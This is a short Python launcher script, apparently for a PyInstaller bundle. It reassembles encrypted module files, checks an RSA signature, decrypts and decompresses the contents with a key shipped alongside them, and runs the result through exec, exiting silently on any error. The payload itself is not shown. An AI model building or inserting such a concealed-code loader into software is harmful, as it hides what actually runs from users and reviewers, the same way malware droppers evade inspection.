#!/usr/bin/env python3
import sys, base64, zlib, marshal
from pathlib import Path
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PUB_KEY = b'-----BEGIN PUBLIC KEY-----\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA8F2qw9ozoyYzkdZmkIxr\nSTejwu/nE93OwWnf1BKPfEOvFt/rORRssJVSOkriQyBWpTPnDrlh5k1YzaLq+4jT\nQSEHAipToaZHxpeKF8qTzR7e2LbGddZz0RIpdWPgMcjvmYQk1JOdEBtbIqsYRTr5\nGveygelPLAKG7+yWUdvXvyf7kRl57OjxpBewOjAlZyYeUt5j1+CvPv3X+RufC0ZZ\nFTrqetPIB6C+Sk/txTCaD89mG1ngBnXqsahya3dO3TmuTeSNh8mhWhpMWm09sF99\nTsin5zv9QL8m8m4hcWXh9e4+xyj6rhdb/3AoPQFKJAkCBQOxfVRDuWeBMPCpWTco\nhbHoGDhoU59w4JUFLCHBbtk9fS7O5cjKd3LN4hFZizYrF2axJ7C7bnlmPQbxoRwH\nlFIl8gBjnZ0o7Ud3+nN2FvKRKlgovI2LKdXsdnt2sHdjAxt3v8vALf8CK0rkJQEm\nPA+fR/GME91jdXc1UIuhUDnCkX6NYGCVXCnoa0JVL3WdAgMBAAE=\n-----END PUBLIC KEY-----\n'

def aesgcm_decrypt(blob: bytes, key: bytes) -> bytes:
    nonce = blob[:12]
    ct = blob[12:]
    return AESGCM(key).decrypt(nonce, ct, associated_data=None)

try:
    base = Path(getattr(sys, "_MEIPASS", Path(__file__).parent))
    mods = base / "modules"
    files = sorted(mods.glob("p*.bin"))
    blob = b"".join(p.read_bytes() for p in files)
    if b"." not in blob:
        sys.exit(1)
    sig_b64, enc_b64, sym_b64 = blob.split(b".", 2)
    enc = base64.b64decode(enc_b64)
    sig = base64.b64decode(sig_b64)
    sym_key = base64.b64decode(sym_b64)

    pub = serialization.load_pem_public_key(PUB_KEY)
    pub.verify(sig, enc_b64, padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())

    data = zlib.decompress(aesgcm_decrypt(enc, sym_key))
    try:
        code = marshal.loads(data)
    except Exception:
        code = compile(data.decode('utf-8'), "<run>", "exec")
    exec(code, {'__name__': '__main__'})
except Exception:
    sys.exit(1)
